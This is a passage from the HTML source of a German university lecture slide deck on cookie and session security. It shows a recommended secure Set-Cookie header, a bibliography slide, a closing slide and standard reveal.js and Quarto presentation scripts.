+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb39"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb39-1"><a href=""></a>Set-Cookie: key=value; Secure; HttpOnly; Path=/; SameSite=Lax;</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb40"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb40-1"><a href=""></a>Expires=<span class="dt">&lt;</span><span class="kw">Datum</span><span class="ot"> in </span><span class="er">30-90</span><span class="ot"> Tagen</span><span class="dt">&gt;</span>;</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="literaturverzeichnis-i" class="slide level2 content-slide code-slide">
+<h2>Literaturverzeichnis I</h2>
+<p><br></p>
+<p>[1] Mike West. Incrementally Better Cookies. Internet-Draft draft-west-cookie-incrementalism- 01. Work in Progress. Internet Engineering Task Force, 15. März 2020. 17 S. URL: https:</p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb41"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb41-1"><a href=""></a>       //datatracker.ietf.org/doc/draft-west-cookie-incrementalism/01/.</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="vielen-dank" class="slide level2 title-slide center" data-state="hide-footer">
+<h2>Vielen Dank!</h2>
+<p><img class="title-image" src="../../images/datenschutz.jpg" alt="" style="--title-image-width: 120vw; --title-image-right: -500px; --title-image-top: 0px; --title-image-height: 100vh; --title-image-object-position: right right;"></p>
+<p>Prof.&nbsp;Dr.&nbsp;Lukas Iffländer<br>
+HTW Dresden<br>
+31.07.2026</p>
+
+</section>
+    </div>
+  <div class="quarto-auto-generated-content" style="display: none;">
+<p><img src="../../logos/htw-logo-small.jpg" class="slide-logo"></p>
+<div class="footer footer-default">
+<p>31.07.2026 / Cookie und Session-Sicherheit / HTW Dresden / Prof.&nbsp;Dr.&nbsp;Lukas Iffländer</p>
+</div>
+</div></div>
+
+  <script>window.backupDefine = window.define; window.define = undefined;</script>
+  <script src="21_Cookie_und_Session_Security_files/libs/revealjs/dist/reveal.js"></script>
+  <!-- reveal.js plugins -->
+  <script src="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/quarto-line-highlight/line-highlight.js"></script>
+  <script src="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/pdf-export/pdfexport.js"></script>
+  <script src="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/reveal-menu/menu.js"></script>
+  <script src="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/reveal-menu/quarto-menu.js"></script>
+  <script src="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/quarto-support/support.js"></script>
+  
+
+  <script src="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/notes/notes.js"></script>
+  <script src="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/search/search.js"></script>
+  <script src="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/zoom/zoom.js"></script>
+  <script src="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/math/math.js"></script>
+  <script>window.define = window.backupDefine; window.backupDefine = undefined;</script>
+
+  <script>
+
+      // Full list of configuration options available at:
+      // https://revealjs.com/config/
+      Reveal.initialize({
+'controlsAuto': true,
+'previewLinksAuto': false,
+'pdfSeparateFragments': false,
+'autoAnimateEasing': "ease",
+'autoAnimateDuration': 1,
+'autoAnimateUnmatched': true,
+'jumpToSlide': true,
+'menu': {"side":"left","useTextContentForMissingTitles":true,"markers":false,"loadIcons":false,"custom":[{"title":"Tools","icon":"<i class=\"fas fa-gear\"></i>","content":"<ul class=\"slide-menu-items\">\n<li class=\"slide-tool-item active\" data-item=\"0\"><a href=\"#\" onclick=\"RevealMenuToolHandlers.fullscreen(event)\"><kbd>f</kbd> Fullscreen</a></li>\n<li class=\"slide-tool-item\" data-item=\"1\"><a href=\"#\" onclick=\"RevealMenuToolHandlers.speakerMode(event)\"><kbd>s</kbd> Speaker View</a></li>\n<li class=\"slide-tool-item\" data-item=\"2\"><a href=\"#\" onclick=\"RevealMenuToolHandlers.overview(event)\"><kbd>o</kbd> Slide Overview</a></li>\n<li class=\"slide-tool-item\" data-item=\"3\"><a href=\"#\" onclick=\"RevealMenuToolHandlers.togglePdfExport(event)\"><kbd>e</kbd> PDF Export Mode</a></li>\n<li class=\"slide-tool-item\" data-item=\"4\"><a href=\"#\" onclick=\"RevealMenuToolHandlers.toggleScrollView(event)\"><kbd>r</kbd> Scroll View Mode</a></li>\n<li class=\"slide-tool-item\" data-item=\"5\"><a href=\"#\" onclick=\"RevealMenuToolHandlers.keyboardHelp(event)\"><kbd>?</kbd> Keyboard Help</a></li>\n</ul>"}],"openButton":true},
+'smaller': false,
+ 
+        // Display controls in the bottom right corner
+        controls: false,
+
+        // Help the user learn the controls by providing hints, for example by
+        // bouncing the down arrow when they first encounter a vertical slide
+        controlsTutorial: false,
+
+        // Determines where controls appear, "edges" or "bottom-right"
+        controlsLayout: 'edges',
+
+        // Visibility rule for backwards navigation arrows; "faded", "hidden"
+        // or "visible"
+        controlsBackArrows: 'faded',
+
+        // Display a presentation progress bar
+        progress: true,
+
+        // Display the page number of the current slide
+        slideNumber: 'c/t',
+
+        // 'all', 'print', or 'speaker'
+        showSlideNumber: 'all',
+
+        // Add the current slide number to the URL hash so that reloading the
+        // page/copying the URL will return you to the same slide
+        hash: true,
+
+        // Start with 1 for the hash rather than 0
+        hashOneBasedIndex: false,
+
+        // Flags if we should monitor the hash and change slides accordingly
+        respondToHashChanges: true,
+
+        // Push each slide change to the browser history
+        history: true,
+
+        // Enable keyboard shortcuts for navigation
+        keyboard: true,
+
+        // Enable the slide overview mode
+        overview: true,
+
+        // Disables the default reveal.js slide layout (scaling and centering)
+        // so that you can use custom CSS layout
+        disableLayout: false,
+
+        // Vertical centering of slides
+        center: false,
+
+        // Enables touch navigation on devices with touch input
+        touch: true,
+
+        // Loop the presentation
+        loop: false,
+
+        // Change the presentation direction to be RTL
+        rtl: false,
+
+        // see https://revealjs.com/vertical-slides/#navigation-mode
+        navigationMode: 'linear',
+
+        // Randomizes the order of slides each time the presentation loads
+        shuffle: false,
+
+        // Turns fragments on and off globally
+        fragments: true,
+
+        // Flags whether to include the current fragment in the URL,
+        // so that reloading brings you to the same fragment position
+        fragmentInURL: false,
+
+        // Flags if the presentation is running in an embedded mode,
+        // i.e. contained within a limited portion of the screen
+        embedded: false,
+
+        // Flags if we should show a help overlay when the questionmark
+        // key is pressed
+        help: true,
+
+        // Flags if it should be possible to pause the presentation (blackout)
+        pause: true,
+
+        // Flags if speaker notes should be visible to all viewers
+        showNotes: false,
+
+        // Global override for autoplaying embedded media (null/true/false)
+        autoPlayMedia: null,
+
+        // Global override for preloading lazy-loaded iframes (null/true/false)
+        preloadIframes: null,
+
+        // Number of milliseconds between automatically proceeding to the
+        // next slide, disabled when set to 0, this value can be overwritten
+        // by using a data-autoslide attribute on your slides
+        autoSlide: 0,
+
+        // Stop auto-sliding after user input
+        autoSlideStoppable: true,
+
+        // Use this method for navigation when auto-sliding
+        autoSlideMethod: null,
+
+        // Specify the average time in seconds that you think you will spend
+        // presenting each slide. This is used to show a pacing timer in the
+        // speaker view
+        defaultTiming: null,
+
+        // Enable slide navigation via mouse wheel
+        mouseWheel: false,
+
+        // The display mode that will be used to show slides
+        display: 'block',
+
+        // Hide cursor if inactive
+        hideInactiveCursor: true,
+
+        // Time before the cursor is hidden (in ms)
+        hideCursorTime: 5000,
+
+        // Opens links in an iframe preview overlay
+        previewLinks: false,
+
+        // Transition style (none/fade/slide/convex/concave/zoom)
+        transition: 'slide',
+
+        // Transition speed (default/fast/slow)
+        transitionSpeed: 'default',
+
+        // Transition style for full page slide backgrounds
+        // (none/fade/slide/convex/concave/zoom)
+        backgroundTransition: 'none',
+
+        // Number of slides away from the current that are visible
+        viewDistance: 3,
+
+        // Number of slides away from the current that are visible on mobile
+        // devices. It is advisable to set this to a lower number than
+        // viewDistance in order to save resources.
+        mobileViewDistance: 2,
+
+        // The "normal" size of the presentation, aspect ratio will be preserved
+        // when the presentation is scaled to fit different resolutions. Can be
+        // specified using percentage units.
+        width: 1280,
+
+        height: 720,
+
+        // Factor of the display size that should remain empty around the content
+        margin: 0,
+
+        math: {
+          mathjax: 'https://cdn.jsdelivr.net/npm/mathjax@2.7.9/MathJax.js',
+          config: 'TeX-AMS_HTML-full',
+          tex2jax: {
+            inlineMath: [['\\(','\\)']],
+            displayMath: [['\\[','\\]']],
+            balanceBraces: true,
+            processEscapes: false,
+            processRefs: true,
+            processEnvironments: true,
+            preview: 'TeX',
+            skipTags: ['script','noscript','style','textarea','pre','code'],
+            ignoreClass: 'tex2jax_ignore',
+            processClass: 'tex2jax_process'
+          },
+        },
+
+        // reveal.js plugins
+        plugins: [QuartoLineHighlight, PdfExport, RevealMenu, QuartoSupport,
+
+          RevealMath,
+          RevealNotes,
+          RevealSearch,
+          RevealZoom
+        ]
+      });
+    </script>
+    <script id="quarto-html-after-body" type="application/javascript">
+      window.document.addEventListener("DOMContentLoaded", function (event) {
+        const tabsets =  window.document.querySelectorAll(".panel-tabset-tabby")
+        tabsets.forEach(function(tabset) {
+          const tabby = new Tabby('#' + tabset.id);
+        });
+        const isCodeAnnotation = (el) => {
+          for (const clz of el.classList) {
+            if (clz.startsWith('code-annotation-')) {                     
+              return true;
+            }
+          }
+          return false;
+        }
+        const onCopySuccess = function(e) {
+          // button target
+          const button = e.trigger;
+          // don't keep focus
+          button.blur();
+          // flash "checked"
+          button.classList.add('code-copy-button-checked');
+          var currentTitle = button.getAttribute("title");
+          button.setAttribute("title", "Copied!");
+          let tooltip;
+          if (window.bootstrap) {
+            button.setAttribute("data-bs-toggle", "tooltip");
+            button.setAttribute("data-bs-placement", "left");
+            button.setAttribute("data-bs-title", "Copied!");
+            tooltip = new bootstrap.Tooltip(button, 
+              { trigger: "manual", 
+                customClass: "code-copy-button-tooltip",
+                offset: [0, -8]});
+            tooltip.show();    
+          }
+          setTimeout(function() {
+            if (tooltip) {
+              tooltip.hide();
+              button.removeAttribute("data-bs-title");
+              button.removeAttribute("data-bs-toggle");
+              button.removeAttribute("data-bs-placement");
+            }
+            button.setAttribute("title", currentTitle);
+            button.classList.remove('code-copy-button-checked');
+          }, 1000);
+          // clear code selection
+          e.clearSelection();
+        }
+        const getTextToCopy = function(trigger) {
+          const outerScaffold = trigger.parentElement.cloneNode(true);
+          const codeEl = outerScaffold.querySelector('code');
+          for (const childEl of codeEl.children) {
+            if (isCodeAnnotation(childEl)) {
+              childEl.remove();
+            }
+          }
+          return codeEl.innerText;
+        }
+        const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+          text: getTextToCopy
+        });
+        clipboard.on('success', onCopySuccess);
+        if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+          const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+            text: getTextToCopy,
+            container: window.document.getElementById('quarto-embedded-source-code-modal')
+          });
+          clipboardModal.on('success', onCopySuccess);
+        }
+          var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+          var mailtoRegex = new RegExp(/^mailto:/);
+            var filterRegex = new RegExp('/' + window.location.host + '/');
+          var isInternal = (href) => {
+              return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+          }
+          // Inspect non-navigation links and adorn them if external
+         var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+          for (var i=0; i<links.length; i++) {
+            const link = links[i];
+            if (!isInternal(link.href)) {
+              // undo the damage that might have been done by quarto-nav.js in the case of
+              // links that we want to consider external
+              if (link.dataset.originalHref !== undefined) {
+                link.href = link.dataset.originalHref;
+              }
+            }
+          }
+        function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+          const config = {
+            allowHTML: true,
+            maxWidth: 500,
+            delay: 100,
+            arrow: false,
+            appendTo: function(el) {
+                return el.closest('section.slide') || el.parentElement;
+            },
+            interactive: true,
+            interactiveBorder: 10,
+            theme: 'light-border',
+            placement: 'bottom-start',
+          };
+          if (contentFn) {
+            config.content = contentFn;
+          }
+          if (onTriggerFn) {
+            config.onTrigger = onTriggerFn;
+          }
+          if (onUntriggerFn) {
+            config.onUntrigger = onUntriggerFn;
+          }
+            config['offset'] = [0,0];
+            config['maxWidth'] = 700;
+          window.tippy(el, config); 
+        }
+        const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+        for (var i=0; i<noterefs.length; i++) {
+          const ref = noterefs[i];
+          tippyHover(ref, function() {
+            // use id or data attribute instead here
+            let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+            try { href = new URL(href).hash; } catch {}
+            const id = href.replace(/^#\/?/, "");
+            const note = window.document.getElementById(id);
+            if (note) {
+              return note.innerHTML;
+            } else {
+              return "";
+            }
+          });
+        }
+        const findCites = (el) => {
+          const parentEl = el.parentElement;
+          if (parentEl) {
+            const cites = parentEl.dataset.cites;
+            if (cites) {
+              return {
+                el,
+                cites: cites.split(' ')
+              };
+            } else {
+              return findCites(el.parentElement)
+            }
+          } else {
+            return undefined;
+          }
+        };
+        var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+        for (var i=0; i<bibliorefs.length; i++) {
+          const ref = bibliorefs[i];
+          const citeInfo = findCites(ref);
+          if (citeInfo) {
+            tippyHover(citeInfo.el, function() {
+              var popup = window.document.createElement('div');
+              citeInfo.cites.forEach(function(cite) {
+                var citeDiv = window.document.createElement('div');
+                citeDiv.classList.add('hanging-indent');
+                citeDiv.classList.add('csl-entry');
+                var biblioDiv = window.document.getElementById('ref-' + cite);
+                if (biblioDiv) {
+                  citeDiv.innerHTML = biblioDiv.innerHTML;
+                }
+                popup.appendChild(citeDiv);
+              });
+              return popup.innerHTML;
+            });
+          }
+        }
+      });
+      </script>
+    
+
+</body></html>
